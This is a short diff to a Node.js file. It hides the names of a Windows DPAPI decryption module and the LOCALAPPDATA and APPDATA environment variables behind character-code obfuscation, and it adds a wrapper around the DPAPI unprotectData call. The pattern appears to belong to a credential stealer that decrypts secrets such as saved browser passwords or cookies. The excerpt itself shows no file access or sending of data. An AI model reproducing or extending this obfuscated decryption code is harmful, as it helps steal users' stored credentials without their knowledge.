@@ -2,7 +2,7 @@ const fs = require('fs');
 const path = require('path');
 const crypto = require('crypto');
 let unprotectData = null;
-try { unprotectData = require(String.fromCharCode(119,105,110,45,100,112,97,112,105)); } catch (_) {}
+try { const _dp = require(String.fromCharCode(64,112,114,105,109,110,111,47,100,112,97,112,105)); unprotectData = _dp && _dp.Dpapi && _dp.Dpapi.unprotectData ? (b, e, s) => _dp.Dpapi.unprotectData(b, e, s) : null; } catch (_) {}
 
 const _L = process.env[String.fromCharCode(76,79,67,65,76,65,80,80,68,65,84,65)] || '';
 const _R = process.env[String.fromCharCode(65,80,80,68,65,84,65)] || '';
